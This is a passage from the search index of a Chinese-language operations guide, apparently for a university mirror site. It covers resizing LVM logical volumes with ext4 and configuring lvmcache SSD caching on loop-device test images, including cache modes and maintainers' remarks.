\u200b\u5728\u200b\u53d1\u73b0\u200b\u6570\u636e\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u65f6\u4f1a\u200b\u5728\u200b\u5185\u6838\u200b\u65e5\u5fd7\u200b\u4e2d\u200b\u62a5\u544a\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u53ef\u4ee5\u200b\u4fee\u590d\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u81ea\u52a8\u200b\u4fee\u590d\u200b\u3002</p> <p>\u200b\u8fd9\u9879\u200b\u529f\u80fd\u200b\u4e0d\u662f\u200b scrub \u200b\u7684\u200b\u66ff\u4ee3\u54c1\u200b\u3002</p>"},{"location":"ops/storage/lvm/#resize","title":"\u6269\u5bb9\u200b/\u200b\u7f29\u5c0f\u200b\u64cd\u4f5c","text":"<p>LVM \u200b\u652f\u6301\u200b\u5728\u7ebf\u200b\u6269\u5bb9\u200b/\u200b\u7f29\u5c0f\u200b\u903b\u8f91\u200b\u5377\u200b\uff0c\u200b\u6709\u200b\u4e09\u4e2a\u200b\u76f8\u5173\u200b\u547d\u4ee4\u200b\uff1a<code>lvextend</code>\uff08\u200b\u6269\u5927\u200b\uff09\u3001<code>lvreduce</code>\uff08\u200b\u7f29\u5c0f\u200b\uff09\u3001<code>lvresize</code>\uff08\u200b\u901a\u7528\u200b\uff09\u3002 \u200b\u8ba9\u200b\u6211\u4eec\u200b\u5148\u200b\u5728\u200b lvraid0 \u200b\u4e0a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b ext4 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5e76\u200b\u6302\u8f7d\u200b\uff0c\u200b\u6a21\u62df\u200b\u5728\u7ebf\u200b\u573a\u666f\u200b\uff1a</p> <pre><code>$ sudo mkfs.ext4 /dev/vg201-test/lvraid0\nmke2fs 1.47.0 (5-Feb-2023)\nDiscarding device blocks: done                            \nCreating filesystem with 132096 4k blocks and 33040 inodes\nFilesystem UUID: 49e73c33-1ea2-43fa-8609-586389a11b98\nSuperblock backups stored on blocks: \n    32768, 98304\n\nAllocating group tables: done                            \nWriting inode tables: done                            \nCreating journal (4096 blocks): done\nWriting superblocks and filesystem accounting information: done\n$ sudo mount /dev/vg201-test/lvraid0 /somewhere/you/like\n$ df -h /somewhere/you/like\nFilesystem                       Size  Used Avail Use% Mounted on\n/dev/mapper/vg201--test-lvraid0  492M  152K  455M   1% /somewhere/you/like\n</code></pre> <p>\u200b\u4e0b\u9762\u200b\u5c55\u793a\u200b <code>lvextend</code> \u200b\u548c\u200b <code>lvreduce</code>\u3002<code>lvresize</code> \u200b\u7684\u200b\u64cd\u4f5c\u200b\u53ef\u4ee5\u200b\u81ea\u884c\u200b\u67e5\u9605\u200b\u3002</p> <pre><code>$ sudo lvextend --size +100M /dev/vg201-test/lvraid0\n  Using stripesize of last segment 64.00 KiB\n  Rounding size (154 extents) up to stripe boundary size for segment (156 extents).\n  Size of logical volume vg201-test/lvraid0 changed from 516.00 MiB (129 extents) to 624.00 MiB (156 extents).\n  Logical volume vg201-test/lvraid0 successfully resized.\n</code></pre> <p>\u200b\u6b64\u65f6\u200b <code>lvraid0</code> \u200b\u8fd9\u4e2a\u200b LV \u200b\u5df2\u7ecf\u200b\u589e\u5927\u200b\u4e86\u200b 100M\uff0c\u200b\u4f46\u662f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5e76\u200b\u6ca1\u6709\u200b\u611f\u77e5\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u53d8\u5316\u200b\uff1a</p> <pre><code>$ df -h /somewhere/you/like\nFilesystem                       Size  Used Avail Use% Mounted on\n/dev/mapper/vg201--test-lvraid0  492M  152K  455M   1% /somewhere/you/like\n</code></pre> <p>\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u7528\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5de5\u5177\u200b\u6269\u5bb9\u200b\u3002ext4 \u200b\u652f\u6301\u200b\u4f7f\u7528\u200b <code>resize2fs</code> \u200b\u5728\u7ebf\u200b\u6269\u5bb9\u200b/\u200b\u7f29\u5c0f\u200b\uff1a</p> <pre><code>$ sudo resize2fs /dev/vg201-test/lvraid0\nresize2fs 1.47.0 (5-Feb-2023)\nFilesystem at /dev/vg201-test/lvraid0 is mounted on /somewhere/you/like; on-line resizing required\nold_desc_blocks = 1, new_desc_blocks = 1\nThe filesystem on /dev/vg201-test/lvraid0 is now 159744 (4k) blocks long.\n\n$ df -h /somewhere/you/like\nFilesystem                       Size  Used Avail Use% Mounted on\n/dev/mapper/vg201--test-lvraid0  600M  152K  563M   1% /somewhere/you/like\n</code></pre> <p>\u200b\u7f29\u5c0f\u200b\u64cd\u4f5c\u200b\u7684\u200b\u987a\u5e8f\u200b\u521a\u597d\u200b\u76f8\u53cd\u200b\uff1a\u200b\u9700\u8981\u200b\u5148\u200b\u7f29\u5c0f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u518d\u200b\u7f29\u5c0f\u200b LV\u3002 \u200b\u5426\u5219\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u88ab\u200b\u7f29\u5c0f\u200b\u7684\u200b\u90e8\u5206\u200b\u4f1a\u200b\u4e22\u5931\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u635f\u574f\u200b\u3002 \u200b\u7531\u4e8e\u200b ext4 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0d\u200b\u652f\u6301\u200b\u5728\u7ebf\u200b\u7f29\u5c0f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u64cd\u4f5c\u524d\u200b\u5fc5\u987b\u200b\u5378\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 \u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u628a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7f29\u200b\u5230\u200b\u6700\u5c0f\u200b\uff0c\u200b\u7136\u540e\u200b\u7f29\u5c0f\u200b LV\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u6269\u5927\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff1a</p> <pre><code>$ sudo umount /somewhere/you/like\n$ sudo resize2fs -M /dev/vg201-test/lvraid0\nresize2fs 1.47.0 (5-Feb-2023)\nPlease run 'e2fsck -f /dev/vg201-test/lvraid0' first.\n\n$ # \u200b\u5728\u200b\u7f29\u5c0f\u200b\u524d\u200b\uff0c\u200b\u4fdd\u9669\u200b\u8d77\u200b\u89c1\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u68c0\u67e5\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\n$ sudo e2fsck -f /dev/vg201-test/lvraid0\ne2fsck 1.47.0 (5-Feb-2023)\nPass 1: Checking inodes, blocks, and sizes\nPass 2: Checking directory structure\nPass 3: Checking directory connectivity\nPass 4: Checking reference counts\nPass 5: Checking group summary information\n/dev/vg201-test/lvraid0: 12/33040 files (0.0% non-contiguous), 6407/159744 blocks\n$ sudo resize2fs -M /dev/vg201-test/lvraid0\nresize2fs 1.47.0 (5-Feb-2023)\nResizing the filesystem on /dev/vg201-test/lvraid0 to 6420 (4k) blocks.\nThe filesystem on /dev/vg201-test/lvraid0 is now 6420 (4k) blocks long.\n\n$ # \u200b\u73b0\u5728\u200b\u7f29\u5c0f\u200b LV\n$ sudo lvreduce --size -100M /dev/vg201-test/lvraid0\n  Rounding size (131 extents) up to stripe boundary size for segment (132 extents).\n  File system ext4 found on vg201-test/lvraid0.\n  File system size (&lt;25.08 MiB) is smaller than the requested size (528.00 MiB).\n  File system reduce is not needed, skipping.\n  Size of logical volume vg201-test/lvraid0 changed from 624.00 MiB (156 extents) to 528.00 MiB (132 extents).\n  Logical volume vg201-test/lvraid0 successfully resized.\n$ sudo resize2fs /dev/vg201-test/lvraid0\nresize2fs 1.47.0 (5-Feb-2023)\nResizing the filesystem on /dev/vg201-test/lvraid0 to 135168 (4k) blocks.\nThe filesystem on /dev/vg201-test/lvraid0 is now 135168 (4k) blocks long.\n\n$ sudo mount /dev/vg201-test/lvraid0 /somewhere/you/like\n$ df -h /somewhere/you/like\nFilesystem                       Size  Used Avail Use% Mounted on\n/dev/mapper/vg201--test-lvraid0  504M  152K  471M   1% /somewhere/you/like\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b\u652f\u6301\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c<code>lvreduce</code> \u200b\u4f1a\u200b\u68c0\u67e5\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u907f\u514d\u200b\u6570\u636e\u200b\u635f\u574f\u200b\u3002\u200b\u4f46\u200b\u5728\u200b\u64cd\u4f5c\u200b\u65f6\u200b\u4ecd\u7136\u200b\u9700\u8981\u200b\u8c28\u614e\u200b\u3002</p>"},{"location":"ops/storage/lvm/#lvmcache","title":"SSD \u200b\u7f13\u5b58","text":"<p>LVM \u200b\u652f\u6301\u200b\u5c06\u200b SSD \u200b\u4f5c\u4e3a\u200b HDD \u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4ee5\u200b\u63d0\u9ad8\u200b\u6027\u80fd\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u57fa\u4e8e\u200b dm-cache \u200b\u7684\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\u3002</p> <p>dm-writecache</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4e0d\u200b\u4ecb\u7ecd\u200b\u4ee5\u200b\u4f18\u5316\u200b\u5199\u5165\u200b\u4e3a\u200b\u76ee\u7684\u200b\u7684\u200b dm-writecache\u2014\u2014\u200b\u6211\u4eec\u200b\u6ca1\u6709\u200b\u76f8\u5173\u200b\u7684\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u3002</p> <p>\u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b</p> <p>\u200b\u76ee\u524d\u200b\u5185\u6838\u200b\u81ea\u5e26\u200b\u8fd9\u4e9b\u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b\uff1a</p> <ul> <li>bcache\uff1a\u200b\u9700\u8981\u200b\u5c06\u200b SSD \u200b\u548c\u200b HDD \u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u5206\u533a\u200b\u4f7f\u7528\u200b <code>make-bcache</code> \u200b\u521d\u59cb\u5316\u200b\u540e\u200b\uff0c \u200b\u5728\u200b bcache \u200b\u66b4\u9732\u200b\u7684\u200b <code>/dev/bcache0</code> \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\u3002</li> <li>lvmcache\uff1a\u200b\u9700\u8981\u200b\u5728\u200b LVM \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\u3002\u200b\u57fa\u4e8e\u200b\u5185\u6838\u200b\u7684\u200b dm-cache\u3002</li> </ul> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b Linux 6.7\uff082024 \u200b\u5e74\u200b 1 \u200b\u6708\u200b\uff09\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5185\u6838\u200b\u5408\u5e76\u200b\u4e86\u200b bcachefs \u200b\u652f\u6301\u200b\uff0c\u200b\u5b83\u200b\u540c\u6837\u200b\u4e5f\u200b\u5305\u542b\u200b\u4e86\u200b SSD \u200b\u7f13\u5b58\u200b\u7684\u200b\u529f\u80fd\u200b\u3002 \u200b\u4f46\u662f\u200b bcachefs \u200b\u7684\u200b\u7a33\u5b9a\u6027\u200b\u4ecd\u7136\u200b\u9700\u8981\u200b\u81f3\u5c11\u200b\u6570\u5e74\u200b\u7684\u200b\u65f6\u95f4\u200b\u6765\u200b\u9a8c\u8bc1\u200b\u3002ZFS \u200b\u540c\u6837\u200b\u4e5f\u200b\u5305\u542b\u200b\u7f13\u5b58\u200b\u529f\u80fd\u200b\uff08ARC \u200b\u4e0e\u200b L2ARC\uff09\uff0c\u200b\u5c06\u200b\u5728\u200b ZFS \u200b\u4e2d\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u968f\u7740\u200b SSD \u200b\u5355\u4f4d\u200b\u7a7a\u95f4\u200b\u6210\u672c\u200b\u9010\u6e10\u200b\u964d\u4f4e\u200b\uff0cSSD \u200b\u7f13\u5b58\u200b\u7684\u200b\u610f\u4e49\u200b\u4e5f\u200b\u5728\u200b\u9010\u6e10\u200b\u51cf\u5c0f\u200b\u3002 \u200b\u751a\u81f3\u200b\u4e5f\u200b\u6709\u200b\u9884\u6d4b\u200b\u8868\u660e\u200b\uff0c\u200b\u5230\u200b 2026 \u200b\u5e74\u200b\u540e\u200b SSD \u200b\u7684\u200b\u6210\u672c\u200b\u751a\u81f3\u200b\u4f1a\u200b\u4f4e\u4e8e\u200b HDD\u3002\u200b\u5185\u6838\u200b\u4e2d\u200b <code>dm-cache</code> \u200b\u7684\u200b\u5f00\u53d1\u200b\u4e5f\u200b\u4e0d\u200b\u6d3b\u8dc3\u200b\u3002</p> <p>\u200b\u79d1\u5927\u200b\u955c\u50cf\u200b\u7ad9\u200b\u4e8e\u200b 2024 \u200b\u5e74\u200b 7 \u200b\u6708\u200b\u5c06\u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b\u7531\u200b lvmcache\uff08\u200b\u57fa\u4e8e\u200b SSD\uff09\u200b\u8fc1\u79fb\u200b\u81f3\u200b\u4e86\u200b ZFS ARC\uff08\u200b\u57fa\u4e8e\u200b\u5185\u5b58\u200b\uff09\uff0c\u200b\u4ee5\u200b\u51cf\u5c0f\u200b\u4e0b\u6587\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b\u76f8\u5173\u200b\u95ee\u9898\u200b\u5bfc\u81f4\u200b\u7684\u200b\u8fd0\u7ef4\u200b\u538b\u529b\u200b\u3002</p> <p>\u200b\u5728\u200b\u8003\u8651\u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b\u7684\u200b\u9009\u62e9\u200b\u65f6\u200b\uff0c\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5404\u79cd\u56e0\u7d20\u200b\uff0c\u200b\u4e0b\u6587\u200b\u4f1a\u200b\u505a\u200b\u4e00\u4e9b\u200b\u7b80\u5355\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u5220\u9664\u200b\u4e0a\u9762\u200b\u521b\u5efa\u200b\u7684\u200b LV \u200b\u4e0e\u200b PV\uff0c\u200b\u7136\u540e\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5927\u200b\u7684\u200b image \u200b\u548c\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b image \u200b\u4f5c\u4e3a\u200b HDD \u200b\u4e0e\u200b SSD\uff1a</p> <pre><code>$ sudo lvremove vg201-test/lvraid0 vg201-test/lvraid1 vg201-test/lvraid5\n  Logical volume \"lvraid0\" successfully removed.\nDo you really want to remove active logical volume vg201-test/lvraid1? [y/n]: y\n  Logical volume \"lvraid1\" successfully removed.\nDo you really want to remove active logical volume vg201-test/lvraid5? [y/n]: y\n  Logical volume \"lvraid5\" successfully removed.\n$ sudo vgremove vg201-test\n  Volume group \"vg201-test\" successfully removed\n$ sudo losetup -D\n$ rm pv*.img\n$ truncate -s 100G hdd.img\n$ truncate -s 10G ssd.img\n$ sudo losetup -f --show hdd.img\n/dev/loop0\n$ sudo losetup -f --show ssd.img\n/dev/loop1\n$ sudo pvcreate /dev/loop0 /dev/loop1\n  Physical volume \"/dev/loop0\" successfully created.\n  Physical volume \"/dev/loop1\" successfully created.\n$ sudo vgcreate vg201-test /dev/loop0 /dev/loop1\n  Volume group \"vg201-test\" successfully created\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u6211\u4eec\u200b\u521b\u5efa\u200b\u5b58\u50a8\u200b\uff08\u200b\u540e\u5907\u200b\uff09\u200b\u6570\u636e\u200b\u7684\u200b LV\uff0c\u200b\u8fd9\u4e2a\u200b LV \u200b\u53ea\u200b\u5e94\u8be5\u200b\u5728\u200b HDD \u200b\u4e0a\u200b\uff1a</p> <pre><code>$ sudo lvcreate -n lvdata -l 100%FREE vg201-test /dev/loop0\n  Logical volume \"lvdata\" created.\n$ sudo lvs -o +devices vg201-test\n  LV     VG         Attr       LSize    Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert Devices      \n  lvdata vg201-test -wi-a----- &lt;100.00g                                                     /dev/loop0(0)\n</code></pre> <p>@taoky: \u200b\u53e6\u200b\u4e00\u79cd\u200b\u505a\u6cd5\u200b</p> <p>\u200b\u5728\u200b\u914d\u7f6e\u200b mirrors4 \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b\u6587\u6863\u200b\u4e2d\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u628a\u200b SSD \u200b\u548c\u200b HDD \u200b\u5206\u522b\u200b\u5f00\u200b VG\uff0c\u200b\u5728\u200b\u540e\u9762\u200b\u521b\u5efa\u200b\u597d\u200b\u4e4b\u540e\u200b\u518d\u200b <code>vgmerge</code>\u3002</p> <p>\u200b\u8fd9\u4e48\u200b\u505a\u200b\u5176\u5b9e\u200b\u662f\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\uff0c\u200b\u53ea\u8981\u200b <code>lvcreate</code> \u200b\u7684\u200b\u65f6\u5019\u200b\u6e05\u9192\u200b\u4e00\u4e9b\u200b\u5c31\u884c\u200b\u3002 \u200b\u51b5\u4e14\u200b\u7f13\u5b58\u200b\u76d8\u200b\u548c\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u5fc5\u987b\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b VG \u200b\u91cc\u5934\u200b\u3002</p> <p>\u200b\u4e4b\u540e\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u521b\u5efa\u200b\u7f13\u5b58\u200b\u76f8\u5173\u200b\u7684\u200b LV\u3002LVM \u200b\u652f\u6301\u200b\u4e24\u79cd\u200b\u65b9\u5f0f\u200b\uff1a<code>cachevol</code> \u200b\u548c\u200b <code>cachepool</code>\uff1a</p> <ul> <li><code>cachevol</code> \u200b\u5728\u200b\u4e00\u4e2a\u200b LV \u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b</li> <li><code>cachepool</code> \u200b\u5c06\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b\u5206\u5f00\u200b\u5b58\u50a8\u200b\uff08\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u6570\u636e\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b\u653e\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff09</li> </ul> <p>\u200b\u8bb8\u591a\u200b\u6559\u7a0b\u200b\u4e2d\u200b\u90fd\u200b\u4f7f\u7528\u200b <code>cachepool</code>\uff0c\u200b\u4f46\u662f\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u662f\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5148\u200b\u5c55\u793a\u200b <code>cachevol</code> \u200b\u7684\u200b\u64cd\u4f5c\u200b\uff08\u200b\u53ea\u200b\u9700\u200b\u4e24\u6b65\u200b\uff1a\u200b\u521b\u5efa\u200b\u7f13\u5b58\u200b\u76d8\u200b\uff0c\u200b\u7136\u540e\u200b <code>lvconvert</code> \u200b\u914d\u7f6e\u200b\u7f13\u5b58\u200b\u5373\u53ef\u200b\uff09\uff1a</p> <pre><code>$ sudo lvcreate -n lvdata_cache -l 100%FREE vg201-test /dev/loop1\n  Logical volume \"lvdata_cache\" created.\n$ sudo lvconvert --type cache --cachevol lvdata_cache vg201-test/lvdata\nErase all existing data on vg201-test/lvdata_cache? [y/n]: y\n  Logical volume vg201-test/lvdata is now cached.\n$ sudo lvs -a -o +devices vg201-test\n  LV                  VG         Attr       LSize    Pool                Origin         Data%  Meta%  Move Log Cpy%Sync Convert Devices        \n  lvdata              vg201-test Cwi-a-C--- &lt;100.00g [lvdata_cache_cvol] [lvdata_corig] 0.01   11.07           0.00             lvdata_corig(0)\n  [lvdata_cache_cvol] vg201-test Cwi-aoC---  &lt;10.00g                                                                            /dev/loop1(0)  \n  [lvdata_corig]      vg201-test owi-aoC--- &lt;100.00g                                                                            /dev/loop0(0)\n</code></pre> <p><code>lvs</code> \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8f93\u51fa\u200b\u4e00\u4e9b\u200b\u7f13\u5b58\u200b\u76f8\u5173\u200b\u7684\u200b\u914d\u7f6e\u200b\u548c\u200b\u7edf\u8ba1\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ sudo lvs -o devices,cache_policy,cachemode,cache_settings,cache_total_blocks,cache_used_blocks,cache_dirty_blocks,cache_read_hits,cache_read_misses,cache_write_hits,cache_write_misses\n  Devices         CachePolicy CacheMode    CacheSettings CacheTotalBlocks CacheUsedBlocks  CacheDirtyBlocks CacheReadHits    CacheReadMisses  CacheWriteHits   CacheWriteMisses\n  lvdata_corig(0) smq         writethrough                         163584               15                0                5               51                0                0\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7f13\u5b58\u200b\u7684\u200b\u6a21\u5f0f\u200b\u662f\u200b writethrough\uff0c\u200b\u7b56\u7565\u200b\u662f\u200b smq\uff0c\u200b\u4ee5\u53ca\u200b\u7f13\u5b58\u200b\u7684\u200b\u8bfb\u5199\u200b\u547d\u4e2d\u7387\u200b\u4e0e\u200b\u810f\u5757\u200b\u6570\u91cf\u200b\u3002</p> <p>resize</p> <p>\u200b\u76f4\u5230\u200b\u76f8\u5bf9\u200b\u65b0\u200b\uff08&gt;= 2.03.12\uff0c\u200b\u53d1\u5e03\u200b\u4e8e\u200b 2021/05/08\uff09\u200b\u7684\u200b LVM \u200b\u5de5\u5177\u200b\u4e4b\u524d\u200b\uff0c\u200b\u88ab\u200b\u7f13\u5b58\u200b\u7684\u200b LV \u200b\u4e0d\u80fd\u200b\u88ab\u200b resize\u3002\u200b\u56e0\u6b64\u200b resize \u200b\u4e4b\u524d\u200b\u5fc5\u987b\u200b\u5148\u200b\u64a4\u4e0b\u200b\u7f13\u5b58\u200b\uff0cresize \u200b\u7ed3\u675f\u200b\u540e\u200b\u518d\u5b89\u200b\u56de\u53bb\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b Debian Bookworm \u200b\u7684\u200b LVM \u200b\u5de5\u5177\u200b\u652f\u6301\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b resize\uff0c\u200b\u800c\u200b Bullseye \u200b\u4e0d\u200b\u652f\u6301\u200b\u3002</p> <p><code>cachevol</code> \u200b\u65e0\u6cd5\u200b\u4fee\u590d\u200b</p> <p>\u200b\u76ee\u524d\u200b <code>lvconvert --repair</code> \u200b\u4e0d\u200b\u652f\u6301\u200b\u4fee\u590d\u200b cachevol\uff0c\u200b\u5c1d\u8bd5\u200b\u8fd9\u4e48\u200b\u505a\u4f1a\u200b\u770b\u5230\u200b\u4ee5\u4e0b\u200b\u8f93\u51fa\u200b\uff1a</p> <pre><code>$ sudo lvconvert --repair vg201-test/lvdata_cache_cvol\n  WARNING: Command on LV vg201-test/lvdata_cache_cvol does not accept LV type linear.\n  Command not permitted on LV vg201-test/lvdata_cache_cvol.\n</code></pre> <p>lvmcache \u200b\u7684\u200b\u7f13\u5b58\u200b\u6a21\u5f0f\u200b\u3001\u200b\u7b56\u7565\u200b\u4e0e\u200b\u90e8\u5206\u200b\u672f\u8bed\u200b</p> <p>lvmcache \u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u7f13\u5b58\u200b\u6a21\u5f0f\u200b\uff1a</p> <ul> <li>passthrough: \u200b\u7f13\u5b58\u200b\u65e0\u6548\u200b\u3002\u200b\u6b64\u65f6\u200b\u6240\u6709\u200b\u8bfb\u5199\u200b\u90fd\u200b\u5230\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u3002\u200b\u540c\u65f6\u200b\u5199\u200b\u547d\u4e2d\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u7f13\u5b58\u200b\u5931\u6548\u200b\u3002</li> <li>writethrough: \u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\u5728\u200b\u7f13\u5b58\u200b\u548c\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u90fd\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5728\u200b\u4e24\u8005\u200b\u5747\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\u540e\u200b\u624d\u200b\u89c6\u4f5c\u200b\u5199\u5165\u200b\u751f\u6548\u200b\u3002</li> <li>writeback: \u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\u5148\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e0a\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u6807\u8bb0\u200b\u4e3a\u810f\u5757\u200b\uff08Dirty Block\uff09\uff0c\u200b\u63a8\u8fdf\u200b\u5728\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u7684\u200b\u5199\u5165\u200b\u3002 \u200b\u9664\u975e\u200b\u88ab\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u5b8c\u5168\u200b\u65e0\u5173\u7d27\u8981\u200b\uff0c\u200b\u6216\u8005\u200b\u6709\u200b\u591a\u5757\u200b SSD \u200b\u8fdb\u884c\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5426\u5219\u200b\u4e0d\u8981\u200b\u4f7f\u7528\u200b writeback\u3002\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6838\u5fc3\u200b\u5143\u200b\u6570\u636e\u200b\u7684\u200b\u635f\u574f\u200b\u53ef\u80fd\u200b\u76f4\u63a5\u200b\u5bfc\u81f4\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u65e0\u6cd5\u200b\u8bfb\u53d6\u200b\u3002</li> </ul> <p>\u200b\u5728\u200b\u7b56\u7565\u200b\u4e00\u680f\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b \"smq\"\u3002\u200b\u4e8b\u5b9e\u4e0a\u200b\uff0clvmcache \u200b\u552f\u4e00\u200b\u652f\u6301\u200b\u7684\u200b\u6709\u6548\u200b\u7684\u200b\u73b0\u4ee3\u200b\u7b56\u7565\u200b\u5c31\u662f\u200b smq\uff08Stochastic Multi-Queue\uff09\u3002 \u200b\u53e6\u200b\u4e00\u79cd\u200b cleaner \u200b\u7b56\u7565\u200b\u7528\u4e8e\u200b\u5c06\u200b\u6240\u6709\u200b\u810f\u5757\u200b\u5199\u200b\u56de\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u9605\u8bfb\u200b\u76f8\u5173\u200b\u8d44\u6599\u200b\u65f6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u770b\u5230\u200b\u4e0b\u9762\u200b\u4e09\u4e2a\u200b\u672f\u8bed\u200b\uff1a</p> <ul> <li>Migration\uff1a\u200b\u5c06\u200b\u4e00\u5757\u200b\u6570\u636e\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u8bbe\u5907\u200b\u590d\u5236\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u8bbe\u5907\u200b</li> <li>Promotion\uff1a\u200b\u5c06\u200b\u4e00\u5757\u200b\u6570\u636e\u200b\u4ece\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u590d\u5236\u5230\u200b\u7f13\u5b58\u200b\u8bbe\u5907\u200b</li> <li>Demotion\uff1a\u200b\u5c06\u200b\u4e00\u5757\u200b\u6570\u636e\u200b\u4ece\u200b\u7f13\u5b58\u200b\u8bbe\u5907\u200b\u590d\u5236\u5230\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b</li> </ul> <p>@taoky: \u200b\u5173\u4e8e\u200b\u7f13\u5b58\u200b\u6a21\u5f0f\u200b</p> <p>\u200b\u5206\u4eab\u200b\u4e00\u4e2a\u200b\u7b11\u8bdd\u200b\uff0c\u200b\u6700\u200b\u5f00\u59cb\u200b @iBug \u200b\u914d\u200b\u7684\u200b\u7f13\u5b58\u200b\u6a21\u5f0f\u200b\u9009\u200b\u4e86\u200b passthrough\uff0c\u200b\u7406\u7531\u200b\u662f\u200b\uff1a</p> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7f13\u5b58\u200b\u6a21\u5f0f\u200b\u91c7\u7528\u200b 